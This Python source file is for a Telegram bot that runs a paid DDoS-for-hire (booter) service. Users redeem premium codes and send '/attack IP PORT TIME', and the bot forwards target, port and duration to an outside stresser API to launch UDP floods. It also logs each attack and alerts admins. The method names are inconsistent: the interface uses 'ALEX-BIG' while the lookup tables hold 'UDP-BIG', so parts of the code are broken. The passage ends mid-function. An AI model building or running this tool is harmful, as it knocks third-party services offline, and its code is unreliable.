import os
import logging
import asyncio
import aiohttp
import time
import random
import string
import json
import re
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    ContextTypes,
)
from pymongo import MongoClient
from dotenv import load_dotenv

load_dotenv()

# ===== CONFIGURATION =====
TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
API_TOKEN = os.getenv("API_TOKEN", "")
API_BASE = os.getenv("API_BASE", "https://stresser.works")
MONGO_URI = os.getenv("MONGO_URI")
OWNER_ID = int(os.getenv("OWNER_ID", "123456789"))
PSEUDO_OWNER_ID = int(os.getenv("PSEUDO_OWNER_ID", "987654321"))

MIN_DURATION = 60
MAX_DURATION = 200
RATE_LIMIT_SECONDS = 10

# ===== ATTACK METHODS =====
ATTACK_METHODS = ["UDP-BIG", "UDP-Gbps"]

METHOD_CONCURRENT = {
    "UDP-BIG": 4,
    "UDP-Gbps": 2,
}

METHOD_ENDPOINT = {
    "UDP-BIG": "/api/start",
    "UDP-Gbps": "/api/bota/start",
}

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO,
)
logger = logging.getLogger(__name__)

_user_cooldowns = {}


def check_rate_limit(user_id):
    now = time.time()
    last = _user_cooldowns.get(user_id, 0)
    if now - last < RATE_LIMIT_SECONDS:
        remaining = int(RATE_LIMIT_SECONDS - (now - last))
        return False, f"⏳ Rate limited! Wait {remaining}s before next attack."
    _user_cooldowns[user_id] = now
    return True, "OK"


def is_valid_host(host):
    if not host or len(host) > 253:
        return False
    ipv4 = re.match(r'^(\d{1,3}\.){3}\d{1,3}$', host)
    if ipv4:
        return all(0 <= int(p) <= 255 for p in host.split('.'))
    hostname = re.match(r'^[a-zA-Z0-9]([a-zA-Z0-9\-\.]{0,251}[a-zA-Z0-9])?$', host)
    return bool(hostname)


# ===== DATABASE =====
class Database:
    def __init__(self, mongo_uri):
        self.memory_mode = True
        self.users = {}
        self.codes = {}
        self.logs = []
        self.admins = {}
        self.settings = {"pause_all": False}

        try:
            if mongo_uri:
                self.client = MongoClient(
                    mongo_uri,
                    serverSelectionTimeoutMS=5000,
                    connectTimeoutMS=5000,
                    socketTimeoutMS=5000,
                )
                self.client.admin.command('ping')

                self.db = self.client["guru_bot"]
                self.users_col = self.db.users
                self.codes_col = self.db.redeem_codes
                self.logs_col = self.db.attack_logs
                self.admins_col = self.db.admins
                self.settings_col = self.db.settings

                self.users_col.create_index("user_id", unique=True)
                self.codes_col.create_index("code", unique=True)
                self.admins_col.create_index("user_id", unique=True)

                if not self.settings_col.find_one({"_id": "bot_settings"}):
                    self.settings_col.insert_one({
                        "_id": "bot_settings",
                        "pause_all": False,
                        "paused_by": None,
                        "paused_at": None,
                        "pause_reason": None,
                    })

                self.memory_mode = False
                logger.info("✅ MongoDB connected successfully!")
            else:
                raise Exception("No MongoDB URI provided")
        except Exception as e:
            logger.error(f"❌ MongoDB connection failed: {e}")
            self.memory_mode = True
            logger.warning("⚠️ Using in-memory storage")

    def add_user(self, user_id, username=None, first_name=None):
        try:
            if self.memory_mode:
                if user_id not in self.users:
                    self.users[user_id] = {
                        "user_id": user_id,
                        "username": username or "N/A",
                        "first_name": first_name or "User",
                        "plan": "free",
                        "plan_expiry": None,
                        "has_used_code": False,
                        "is_banned": False,
                        "attack_count": 0,
                        "created_at": datetime.now(),
                    }
                    return True
                return False
            self.users_col.update_one(
                {"user_id": user_id},
                {"$setOnInsert": {
                    "username": username or "N/A",
                    "first_name": first_name or "User",
                    "plan": "free",
                    "plan_expiry": None,
                    "has_used_code": False,
                    "is_banned": False,
                    "attack_count": 0,
                    "created_at": datetime.now(),
                }},
                upsert=True,
            )
            return True
        except Exception as e:
            logger.error(f"Error adding user: {e}")
            return False

    def get_user(self, user_id):
        try:
            if self.memory_mode:
                return self.users.get(user_id)
            return self.users_col.find_one({"user_id": user_id})
        except Exception as e:
            logger.error(f"Error getting user: {e}")
            return None

    def get_user_plan(self, user_id):
        try:
            user = self.get_user(user_id)
            if not user:
                return "free", None
            plan = user.get("plan", "free")
            expiry = user.get("plan_expiry")
            if plan == "free":
                return "free", None
            if plan == "premium":
                if expiry is None:
                    return "premium", None
                if isinstance(expiry, str):
                    try:
                        expiry = datetime.fromisoformat(expiry)
                    except Exception:
                        return "premium", None
                if expiry and isinstance(expiry, datetime):
                    return "premium", expiry
                return "premium", None
            return plan, expiry
        except Exception as e:
            logger.error(f"Error getting user plan: {e}")
            return "free", None

    def update_user_plan(self, user_id, plan, expiry):
        try:
            if self.memory_mode:
                if user_id in self.users:
                    self.users[user_id]["plan"] = plan
                    self.users[user_id]["plan_expiry"] = expiry.isoformat() if expiry else None
                    return True
                return False
            expiry_str = expiry.isoformat() if expiry else None
            result = self.users_col.update_one(
                {"user_id": user_id},
                {"$set": {
                    "plan": plan,
                    "plan_expiry": expiry_str,
                    "has_used_code": True if plan == "premium" else False,
                }},
            )
            return result.modified_count > 0 or result.matched_count > 0
        except Exception as e:
            logger.error(f"Error updating user plan: {e}")
            return False

    def cancel_user_membership(self, user_id):
        try:
            if self.memory_mode:
                if user_id in self.users:
                    self.users[user_id]["plan"] = "free"
                    self.users[user_id]["plan_expiry"] = None
                    self.users[user_id]["has_used_code"] = False
                    return True
                return False
            result = self.users_col.update_one(
                {"user_id": user_id},
                {"$set": {
                    "plan": "free",
                    "plan_expiry": None,
                    "has_used_code": False,
                    "membership_cancelled_at": datetime.now(),
                }},
            )
            return result.modified_count > 0 or result.matched_count > 0
        except Exception as e:
            logger.error(f"Error cancelling membership: {e}")
            return False

    def get_code_by_value(self, code):
        try:
            if self.memory_mode:
                return self.codes.get(code)
            return self.codes_col.find_one({"code": code})
        except Exception as e:
            logger.error(f"Error getting code: {e}")
            return None

    def delete_any_code(self, code):
        try:
            if self.memory_mode:
                if code in self.codes:
                    del self.codes[code]
                    return True
                return False
            result = self.codes_col.delete_one({"code": code})
            return result.deleted_count > 0
        except Exception as e:
            logger.error(f"Error deleting code: {e}")
            return False

    def revoke_membership_by_code(self, code):
        try:
            code_data = self.get_code_by_value(code)
            if not code_data:
                return False, "Code not found"
            if not code_data.get("is_used") and not code_data.get("used_by"):
                return False, "Code has not been used yet"
            used_by = code_data.get("used_by")
            if not used_by:
                return False, "No user associated with this code"
            self.cancel_user_membership(used_by)
            return True, used_by
        except Exception as e:
            logger.error(f"Error revoking membership: {e}")
            return False, str(e)

    def is_admin(self, user_id):
        try:
            if self.memory_mode:
                return user_id in self.admins
            return self.admins_col.find_one({"user_id": user_id}) is not None
        except Exception:
            return False

    def get_admin_level(self, user_id):
        try:
            if self.memory_mode:
                return self.admins.get(user_id, {}).get("level")
            admin = self.admins_col.find_one({"user_id": user_id})
            return admin.get("level") if admin else None
        except Exception:
            return None

    def is_owner_or_pseudo(self, user_id):
        return self.get_admin_level(user_id) in ["owner", "pseudo_owner"]

    def add_admin(self, user_id, username, level, added_by):
        try:
            if self.is_admin(user_id):
                return False
            if self.memory_mode:
                self.admins[user_id] = {"user_id": user_id, "level": level}
                if user_id in self.users:
                    self.users[user_id]["plan"] = "premium"
                return True
            self.admins_col.insert_one({
                "user_id": user_id,
                "username": username,
                "level": level,
                "added_by": added_by,
                "added_at": datetime.now(),
            })
            self.update_user_plan(user_id, "premium", None)
            return True
        except Exception as e:
            logger.error(f"Error adding admin: {e}")
            return False

    def remove_admin(self, user_id):
        try:
            if self.memory_mode:
                if user_id in self.admins:
                    del self.admins[user_id]
                    return True
                return False
            result = self.admins_col.delete_one({"user_id": user_id})
            return result.deleted_count > 0
        except Exception:
            return False

    def get_admins(self):
        try:
            if self.memory_mode:
                return [{"user_id": uid, "level": d.get("level", "admin")}
                        for uid, d in self.admins.items()]
            return list(self.admins_col.find({}))
        except Exception:
            return []

    def is_banned(self, user_id):
        try:
            user = self.get_user(user_id)
            return user.get("is_banned", False) if user else False
        except Exception:
            return False

    def ban_user(self, user_id, reason=None, banned_by=None):
        try:
            if self.memory_mode:
                if user_id in self.users:
                    self.users[user_id]["is_banned"] = True
                    self.users[user_id]["ban_reason"] = reason
                return True
            self.users_col.update_one(
                {"user_id": user_id},
                {"$set": {"is_banned": True, "ban_reason": reason,
                          "banned_by": banned_by, "banned_at": datetime.now()}},
            )
            return True
        except Exception:
            return False

    def unban_user(self, user_id):
        try:
            if self.memory_mode:
                if user_id in self.users:
                    self.users[user_id]["is_banned"] = False
                    self.users[user_id]["ban_reason"] = None
                return True
            self.users_col.update_one(
                {"user_id": user_id},
                {"$set": {"is_banned": False, "ban_reason": None,
                          "banned_by": None, "banned_at": None}},
            )
            return True
        except Exception:
            return False

    def create_code(self, code, days, created_by):
        try:
            if self.memory_mode:
                if code in self.codes:
                    return False
                self.codes[code] = {
                    "code": code,
                    "access_days": days,
                    "created_by": created_by,
                    "created_at": datetime.now(),
                    "is_used": False,
                }
                return True
            if self.codes_col.find_one({"code": code}):
                return False
            self.codes_col.insert_one({
                "code": code,
                "access_days": days,
                "created_by": created_by,
                "created_at": datetime.now(),
                "used_by": None,
                "used_at": None,
                "is_used": False,
            })
            return True
        except Exception as e:
            logger.error(f"Error creating code: {e}")
            return False

    def use_code(self, code, user_id):
        try:
            if self.memory_mode:
                if code not in self.codes or self.codes[code].get("is_used"):
                    return None
                code_data = self.codes[code]
                code_data["is_used"] = True
                code_data["used_by"] = user_id
                code_data["used_at"] = datetime.now()
                days = code_data["access_days"]
                expiry = None if days >= 3650 else datetime.now() + timedelta(days=days)
                if user_id not in self.users:
                    self.add_user(user_id)
                self.users[user_id]["plan"] = "premium"
                self.users[user_id]["plan_expiry"] = expiry
                self.users[user_id]["has_used_code"] = True
                return code_data
            code_data = self.codes_col.find_one({"code": code, "is_used": False})
            if not code_data:
                return None
            self.codes_col.update_one(
                {"code": code},
                {"$set": {"is_used": True, "used_by": user_id,
                          "used_at": datetime.now()}},
            )
            days = code_data["access_days"]
            expiry = None if days >= 3650 else datetime.now() + timedelta(days=days)
            if not self.get_user(user_id):
                self.add_user(user_id)
            expiry_str = expiry.isoformat() if expiry else None
            self.users_col.update_one(
                {"user_id": user_id},
                {"$set": {
                    "plan": "premium",
                    "plan_expiry": expiry_str,
                    "has_used_code": True,
                    "code_used": code,
                    "redeem_date": datetime.now().isoformat(),
                }},
            )
            return code_data
        except Exception as e:
            logger.error(f"Error using code: {e}")
            return None

    def get_codes(self, only_unused=False):
        try:
            if self.memory_mode:
                codes = list(self.codes.values())
                if only_unused:
                    codes = [c for c in codes if not c.get("is_used")]
                return codes
            query = {"is_used": False} if only_unused else {}
            return list(self.codes_col.find(query).sort("created_at", -1))
        except Exception:
            return []

    def delete_code(self, code):
        try:
            if self.memory_mode:
                if code in self.codes:
                    del self.codes[code]
                    return True
                return False
            result = self.codes_col.delete_one({"code": code})
            return result.deleted_count > 0
        except Exception:
            return False

    def log_attack(self, user_id, target, port, duration, method, status, response, concurrent_count=1):
        try:
            log = {
                "user_id": user_id,
                "target": target,
                "port": port,
                "duration": duration,
                "method": method,
                "status": status,
                "concurrent": concurrent_count,
                "response": response[:500] if response else None,
                "timestamp": datetime.now(),
            }
            if self.memory_mode:
                self.logs.append(log)
                if user_id in self.users:
                    self.users[user_id]["attack_count"] = self.users[user_id].get("attack_count", 0) + 1
            else:
                self.logs_col.insert_one(log)
                self.users_col.update_one(
                    {"user_id": user_id},
                    {"$inc": {"attack_count": 1},
                     "$set": {"last_attack_time": datetime.now().isoformat(),
                              "last_attack_duration": duration}},
                )
            return True
        except Exception:
            return False

    def get_total_attacks(self):
        try:
            if self.memory_mode:
                return len(self.logs)
            return self.logs_col.count_documents({})
        except Exception:
            return 0

    def get_user_stats(self, user_id):
        try:
            if self.memory_mode:
                return len([l for l in self.logs if l.get("user_id") == user_id])
            return self.logs_col.count_documents({"user_id": user_id})
        except Exception:
            return 0

    def get_all_users(self):
        try:
            if self.memory_mode:
                return list(self.users.values())
            return list(self.users_col.find({}))
        except Exception:
            return []

    def get_pause_info(self):
        try:
            if self.memory_mode:
                return {"paused": self.settings.get("pause_all", False)}
            settings = self.settings_col.find_one({"_id": "bot_settings"})
            if settings:
                return {
                    "paused": settings.get("pause_all", False),
                    "paused_by": settings.get("paused_by"),
                    "paused_at": settings.get("paused_at"),
                    "pause_reason": settings.get("pause_reason"),
                }
            return {"paused": False}
        except Exception:
            return {"paused": False}

    def set_pause(self, paused, paused_by=None, reason=None):
        try:
            if self.memory_mode:
                self.settings["pause_all"] = paused
            else:
                self.settings_col.update_one(
                    {"_id": "bot_settings"},
                    {"$set": {
                        "pause_all": paused,
                        "paused_by": paused_by,
                        "paused_at": datetime.now() if paused else None,
                        "pause_reason": reason,
                    }},
                    upsert=True,
                )
            return True
        except Exception:
            return False


db = Database(MONGO_URI)


def init_owners():
    try:
        if not db.get_user(OWNER_ID):
            db.add_user(OWNER_ID, "owner", "Owner")
        if not db.is_admin(OWNER_ID):
            db.add_admin(OWNER_ID, "owner", "owner", OWNER_ID)
        plan, _ = db.get_user_plan(OWNER_ID)
        if plan != "premium":
            db.update_user_plan(OWNER_ID, "premium", None)
        logger.info(f"✅ Owner {OWNER_ID} initialized")
    except Exception as e:
        logger.error(f"Error initializing owner: {e}")


def init_pseudo_owner():
    try:
        if PSEUDO_OWNER_ID and PSEUDO_OWNER_ID != 0 and PSEUDO_OWNER_ID != OWNER_ID:
            if not db.get_user(PSEUDO_OWNER_ID):
                db.add_user(PSEUDO_OWNER_ID, "pseudo_owner", "Pseudo Owner")
            if not db.is_admin(PSEUDO_OWNER_ID):
                db.add_admin(PSEUDO_OWNER_ID, "pseudo_owner", "pseudo_owner", OWNER_ID)
            plan, _ = db.get_user_plan(PSEUDO_OWNER_ID)
            if plan != "premium":
                db.update_user_plan(PSEUDO_OWNER_ID, "premium", None)
            logger.info(f"✅ Pseudo Owner {PSEUDO_OWNER_ID} initialized")
    except Exception as e:
        logger.error(f"Error initializing pseudo owner: {e}")


init_owners()
init_pseudo_owner()


# ===== API FUNCTIONS =====
async def send_api_attack(target, port, duration, method):
    if not API_TOKEN:
        return {"success": False, "error": "API_TOKEN missing"}

    endpoint = METHOD_ENDPOINT.get(method)
    if not endpoint:
        return {"success": False, "error": f"Unknown method {method}"}

    url = API_BASE.rstrip('/') + endpoint
    params = {
        "token": API_TOKEN,
        "R": target,
        "O": str(port),
        "time": str(duration),
        "method": method,
        "geolocation": "ALL",
    }
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "application/json, text/plain, */*",
        "Connection": "keep-alive",
    }
    timeout = aiohttp.ClientTimeout(total=35, connect=15)
    conc = METHOD_CONCURRENT.get(method, 1)

    logger.info(f"🚀 {method} → {target}:{port} for {duration}s ({conc}c)")

    try:
        async with aiohttp.ClientSession(timeout=timeout, headers=headers) as session:
            start = time.time()
            async with session.get(url, params=params) as resp:
                elapsed = time.time() - start
                text = await resp.text(encoding='utf-8', errors='ignore')
                try:
                    data = json.loads(text)
                except Exception:
                    data = {"raw": text[:200]}

                ok = resp.status == 200 and (
                    data.get('status') in ('success', 'ok', True)
                    or data.get('success') is True
                    or 'started' in str(data).lower()
                    or 'attack' in str(data).lower()
                )

                return {
                    "success": ok,
                    "status": resp.status,
                    "elapsed": elapsed,
                    "response": data,
                    "attack_id": data.get('attack_id') or data.get('id') or 'N/A',
                    "error": None if ok else data.get('message', f"HTTP {resp.status}"),
                    "concurrent": conc,
                }
    except asyncio.TimeoutError:
        return {"success": False, "error": "Request timeout", "concurrent": conc}
    except Exception as e:
        logger.error(f"API attack failed: {e}")
        return {"success": False, "error": str(e)[:80], "concurrent": conc}


async def send_api_attack_with_retry(target, port, duration, method, retries=3):
    last = None
    for attempt in range(retries):
        last = await send_api_attack(target, port, duration, method)
        if last.get("success"):
            return last
        if attempt < retries - 1:
            await asyncio.sleep(1.5 * (attempt + 1))
    return last


# ===== ATTACK MANAGER =====
class AttackManager:
    def __init__(self):
        self.active_attacks = {}
        self.total_attacks = 0
        self.lock = asyncio.Lock()

    async def can_start_attack(self, user_id):
        if db.is_banned(user_id):
            return False, "❌ You are banned!"
        plan, expiry = db.get_user_plan(user_id)
        is_owner = db.is_owner_or_pseudo(user_id)
        is_admin = db.is_admin(user_id)
        if not is_owner and not is_admin and plan != "premium":
            return False, "❌ PREMIUM REQUIRED\n\nUse `/redeem CODE`."
        if plan == "premium" and expiry and expiry < datetime.now() and not is_owner:
            return False, "❌ PLAN EXPIRED"
        return True, "OK"

    async def start_attack(self, user_id, target, port, duration, method, context):
        async with self.lock:
            self.total_attacks += 1
            attack_id = self.total_attacks
            self.active_attacks[attack_id] = {
                'id': attack_id,
                'user_id': user_id,
                'target': f"{target}:{port}",
                'start_time': datetime.now(),
                'duration': duration,
                'method': method,
                'concurrent': METHOD_CONCURRENT.get(method, 1),
                'task': None,
            }
            task = asyncio.create_task(
                self.execute_attack(attack_id, target, port, duration,
                                    user_id, context, method)
            )
            self.active_attacks[attack_id]['task'] = task
            return True, f"Attack #{attack_id} started ({method})"

    @staticmethod
    def _bar(pct, width=20):
        filled = int(width * pct / 100)
        return "█" * filled + "░" * (width - filled)

    def _progress_text(self, attack_id, target, port, method, concurrent, pct, duration):
        return (
            f"⚡ *Attack #{attack_id} Running*\n\n"
            f"🎯 Target: `{target}:{port}`\n"
            f"📡 Method: `{method}`\n"
            f"🔄 Concurrent: **{concurrent}**\n"
            f"⏱️ Duration: `{duration}s`\n\n"
            f"`{self._bar(pct)}` {pct}%"
        )

    async def execute_attack(self, attack_id, target, port, duration,
                             user_id, context, method):
        concurrent = METHOD_CONCURRENT.get(method, 1)
        start = time.time()

        try:
            status_msg = await context.bot.send_message(
                user_id,
                self._progress_text(attack_id, target, port, method,
                                    concurrent, 0, duration),
                parse_mode='Markdown',
            )
        except Exception:
            status_msg = None

        result = await send_api_attack_with_retry(target, port, duration, method)

        if result.get('success'):
            total = duration
            while True:
                elapsed = time.time() - start
                pct = min(100, int(elapsed / total * 100))
                if status_msg:
                    try:
                        await status_msg.edit_text(
                            self._progress_text(attack_id, target, port, method,
                                                concurrent, pct, duration),
                            parse_mode='Markdown',
                        )
                    except Exception:
                        pass
                if elapsed >= total:
                    break
                await asyncio.sleep(3)

            db.log_attack(user_id, target, port, duration, method,
                          "success", str(result.get('response', {}))[:200], concurrent)
            if status_msg:
                try:
                    await status_msg.edit_text(
                        f"✅ *Attack #{attack_id} COMPLETED*\n\n"
                        f"🎯 Target: `{target}:{port}`\n"
                        f"⏱️ Duration: `{duration}s`\n"
                        f"📡 Method: `{method}`\n"
                        f"🔄 Concurrent: **{concurrent}**\n"
                        f"🆔 Attack ID: `{result.get('attack_id','N/A')}`\n\n"
                        f"`{self._bar(100)}` 100%",
                        parse_mode='Markdown',
                    )
                except Exception:
                    pass
        else:
            db.log_attack(user_id, target, port, duration, method,
                          "failed", str(result.get('error'))[:200], concurrent)
            if status_msg:
                try:
                    await status_msg.edit_text(
                        f"❌ *Attack #{attack_id} FAILED*\n\n"
                        f"🎯 Target: `{target}:{port}`\n"
                        f"📡 Method: `{method}`\n"
                        f"🔄 Concurrent: **{concurrent}**\n"
                        f"❌ Error: `{result.get('error','Unknown')}`",
                        parse_mode='Markdown',
                    )
                except Exception:
                    pass

        await self._notify_admins(context, user_id, attack_id, target, port,
                                  duration, method, concurrent, result)

        async with self.lock:
            self.active_attacks.pop(attack_id, None)

    async def _notify_admins(self, context, user_id, attack_id, target, port,
                             duration, method, concurrent, result):
        user = db.get_user(user_id) or {}
        name = user.get('first_name') or (
            f"@{user.get('username')}" if user.get('username') else f"User {user_id}"
        )
        plan = (user.get('plan') or 'free').upper()
        status = "✅ SUCCESS" if result.get('success') else "❌ FAILED"
        for admin in db.get_admins():
            try:
                await context.bot.send_message(
                    admin['user_id'],
                    f"⚡ *ATTACK ALERT*\n\n"
                    f"{status}\n"
                    f"🆔 Attack #{attack_id}\n"
                    f"👤 User: {name} (`{user_id}`)\n"
                    f"📊 Plan: {plan}\n"
                    f"🎯 `{target}:{port}`\n"
                    f"⏱️ {duration}s | 📡 {method} | 🔄 {concurrent}",
                    parse_mode='Markdown',
                )
            except Exception as e:
                logger.error(f"Admin alert failed: {e}")

    async def stop_attack(self, user_id, attack_id=None):
        async with self.lock:
            if not self.active_attacks:
                return False, "No active attacks!"
            if attack_id and attack_id in self.active_attacks:
                task = self.active_attacks[attack_id].get('task')
                if task:
                    task.cancel()
                self.active_attacks.pop(attack_id, None)
                return True, f"Attack #{attack_id} stopped."
            elif not attack_id:
                n = len(self.active_attacks)
                for a in list(self.active_attacks.values()):
                    if a.get('task'):
                        a['task'].cancel()
                self.active_attacks.clear()
                return True, f"Stopped {n} attack(s)."
            return False, f"Attack #{attack_id} not found."

    def get_stats(self):
        active = list(self.active_attacks.values())
        return {
            'active_attacks': len(active),
            'total_attacks': self.total_attacks,
            'active_targets': [a['target'] for a in active],
        }


attack_manager = AttackManager()


# ===== TELEGRAM HANDLERS =====
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    first_name = user.first_name or "User"
    username = user.username

    db.add_user(user_id, username, first_name)

    plan, expiry = db.get_user_plan(user_id)
    is_admin = db.is_admin(user_id)
    is_owner = db.is_owner_or_pseudo(user_id)

    pause_info = db.get_pause_info()
    if pause_info.get('paused', False):
        await update.message.reply_text("⏸️ *Bot is Paused*", parse_mode='Markdown')
        return

    total_attacks = db.get_user_stats(user_id)
    plan_display = "💎 PREMIUM" if plan == "premium" else "🆓 FREE"
    if plan == "premium" and expiry:
        days_left = max(0, (expiry - datetime.now()).days)
        plan_display = f"💎 PREMIUM ({days_left}d left)"

    stats = attack_manager.get_stats()
    active_text = (f"🟢 Active Attacks: {stats['active_attacks']}"
                   if stats['active_attacks'] > 0 else "🔴 No Active Attacks")

    keyboard = []
    if not db.is_banned(user_id):
        keyboard.append([InlineKeyboardButton("💥 ATTACK", callback_data="attack")])
        keyboard.append([InlineKeyboardButton("👤 MY PLAN", callback_data="my_plan")])
    if is_admin:
        keyboard.append([InlineKeyboardButton("📊 STATS", callback_data="stats")])
        keyboard.append([InlineKeyboardButton("⚙️ ADMIN", callback_data="admin")])
    if is_owner:
        keyboard.append([InlineKeyboardButton("👑 OWNER", callback_data="owner")])

    msg = (
        f"👋 *WELCOME TO GURU*\n\n"
        f"Hello {first_name}! 👋\n"
        f"📊 Total Attacks: {total_attacks}\n"
        f"📊 Plan: {plan_display}\n"
        f"⚡ Status: {active_text}\n\n"
        f"📡 *Methods:*\n"
        f"• ALEX-BIG (4c)\n"
        f"• ALEX-Gbps (2c)\n\n"
        f"⏱️ Duration: {MIN_DURATION}-{MAX_DURATION}s\n\n"
        f"{'💡 Use /redeem CODE to get premium access!' if plan != 'premium' else '🎯 Use /attack IP PORT TIME [METHOD]'}"
    )

    await update.message.reply_text(
        msg,
        reply_markup=InlineKeyboardMarkup(keyboard) if keyboard else None,
        parse_mode='Markdown',
    )


async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    pause_info = db.get_pause_info()
    if pause_info.get('paused', False):
        await update.message.reply_text("⏸️ *Bot is Paused*", parse_mode='Markdown')
        return

    can_start, msg = await attack_manager.can_start_attack(user_id)
    if not can_start:
        await update.message.reply_text(msg, parse_mode='Markdown')
        return

    args = context.args
    if not args or len(args) < 3:
        await update.message.reply_text(
            "❌ *Usage:* `/attack IP PORT TIME [METHOD]`\n\n"
            "Examples:\n"
            "`/attack 1.2.3.4 80 60` (ALEX-BIG, 4c)\n"
            "`/attack 1.2.3.4 80 60 ALEX-Gbps` (2c)\n\n"
            f"⏱️ Time: {MIN_DURATION}-{MAX_DURATION}s\n"
            "📡 Methods: ALEX-BIG (4c), ALEX-Gbps (2c)",
            parse_mode='Markdown',
        )
        return

    try:
        target = args[0]
        port = int(args[1])
        duration = int(args[2])
        method = args[3].upper() if len(args) > 3 else "ALEX-BIG"
        if method not in ATTACK_METHODS:
            method = "ALEX-BIG"

        if duration < MIN_DURATION or duration > MAX_DURATION:
            await update.message.reply_text(
                f"❌ Duration must be {MIN_DURATION}-{MAX_DURATION} seconds!"
            )
            return

        if not is_valid_host(target):
            await update.message.reply_text("❌ Invalid target IP/host.")
            return

        allowed, msg = check_rate_limit(user_id)
        if not allowed:
            await update.message.reply_text(msg)
            return

        ok, msg = await attack_manager.start_attack(
            user_id, target, port, duration, method, context
        )
        if not ok:
            await update.message.reply_text(f"❌ {msg}")
            return

        await update.message.reply_text(
            f"✅ *Attack started*\n\n"
            f"🎯 `{target}:{port}`\n"
            f"📡 `{method}` | 🔄 {METHOD_CONCURRENT[method]}c\n"
            f"⏱️ `{duration}s`\n\n"
            f"📊 Progress will appear in the next message.",
            parse_mode='Markdown',
        )
    except ValueError:
        await update.message.reply_text("❌ Invalid port/time.")


async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not db.is_owner_or_pseudo(user_id):
        await update.message.reply_text("❌ Only owners can stop attacks!")
        return
    args = context.args
    attack_id = int(args[0]) if args and args[0].isdigit() else None
    success, msg = await attack_manager.stop_attack(user_id, attack_id)
    if success:
        await update.message.reply_text(f"🛑 *Attack Stopped!*\n\n{msg}",
                                        parse_mode='Markdown')
    else:
        await update.message.reply_text(f"❌ {msg}")


async def testapi_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not db.is_owner_or_pseudo(user_id):
        await update.message.reply_text("❌ Only owners can test API!")
        return

    args = context.args
    method = "ALEX-BIG"
    host = "1.1.1.1"
    port = 80
    if args and len(args) >= 3:
        host = args[0]
        try:
            port = int(args[1])
        except ValueError:
            port = 80
        if len(args) > 3 and args[3].upper() in ATTACK_METHODS:
            method = args[3].upper()

    msg = await update.message.reply_text(
        f"🔬 Testing `{method}` on `{host}:{port}`…",
        parse_mode='Markdown',
    )
    r = await send_api_attack(host, port, 10, method)
    if r.get("success"):
        await msg.edit_text(
            f"✅ API OK\n"
            f"Status: `{r.get('status')}` | {r.get('elapsed', 0):.2f}s\n"
            f"Attack ID: `{r.get('attack_id')}`\n"
            f"Raw: `{str(r.get('response'))[:150]}`",
            parse_mode='Markdown',
        )
    else:
        await msg.edit_text(
            f"❌ API FAILED\nError: `{r.get('error')}`\n"
            f"Raw: `{str(r.get('response'))[:150]}`",
            parse_mode='Markdown',
        )


async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    stats = attack_manager.get_stats()
    users = db.get_all_users()
    await update.message.reply_text(
        f"📊 *BOT STATUS*\n\n"
        f"⚡ Active Attacks: **{stats['active_attacks']}**\n"
        f"👥 Users: {len(users)}\n"
        f"💥 Total Attacks: {stats['total_attacks']}\n"
        f"📡 Methods: ALEX-BIG (4c), ALEX-Gbps (2c)",
        parse_mode='Markdown',
    )


async def myid_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    u = update.effective_user
    await update.message.reply_text(
        f"🆔 Your ID: `{u.id}`\n👤 Username: @{u.username or 'N/A'}",
        parse_mode='Markdown',
    )


async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    args = context.args
    if not args:
        await update.message.reply_text(
            "🎫 *REDEEM CODE*\n\nSend: `/redeem CODE`\nExample: `/redeem ABC123XYZ`",
            parse_mode='Markdown',
        )
        return
    code = args[0].upper()
    user = db.get_user(user_id)
    if user and user.get('has_used_code'):
        await update.message.reply_text("❌ You already redeemed a code!")
        return
    result = db.use_code(code, user_id)
    if result:
        duration_text = "LIFETIME" if result['access_days'] >= 3650 else f"{result['access_days']} days"
        await update.message.reply_text(
            f"✅ *CODE REDEEMED!*\n\nCode: `{code}`\nDuration: {duration_text}\n📊 Plan: PREMIUM",
            parse_mode='Markdown',
        )
    else:
        await update.message.reply_text(
            "❌ *INVALID CODE*\n\nThe code is invalid or already used.",
            parse_mode='Markdown',
        )


async def revoke_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not db.is_admin(user_id):
        await update.message.reply_text("❌ Admin access required!")
        return
    args = context.args
    if not args:
        await update.message.reply_text(
            "🚫 *REVOKE MEMBERSHIP*\n\n"
            "Usage: `/revoke USER_ID`\n"
            "Or: `/revoke CODE`\n\n"
            "Cancels premium immediately.",
            parse_mode='Markdown',
        )
        return
    target = args[0]
    if target.isdigit():
        target_user_id = int(target)
        if db.is_owner_or_pseudo(target_user_id):
            await update.message.reply_text("❌ Cannot revoke owner's membership!")
            return
        if not db.get_user(target_user_id):
            await update.message.reply_text(f"❌ User {target_user_id} not found!")
            return
        if db.cancel_user_membership(target_user_id):
            await update.message.reply_text(
                f"✅ *MEMBERSHIP REVOKED*\n\nUser: `{target_user_id}`\nPlan: FREE",
                parse_mode='Markdown',
            )
        else:
            await update.message.reply_text(f"❌ Failed to revoke {target_user_id}")
    else:
        code = target.upper()
        success, result = db.revoke_membership_by_code(code)
        if success:
            await update.message.reply_text(
                f"✅ *MEMBERSHIP REVOKED*\n\nCode: `{code}`\nUser: `{result}`",
                parse_mode='Markdown',
            )
        else:
            await update.message.reply_text(f"❌ Failed: {result}")


async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data.clear()
    await update.message.reply_text("✅ Cancelled!")


# ===== CALLBACK HANDLERS =====
async def attack_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id

    pause_info = db.get_pause_info()
    if pause_info.get('paused', False):
        await query.edit_message_text("⏸️ *Bot is Paused*", parse_mode='Markdown')
        return

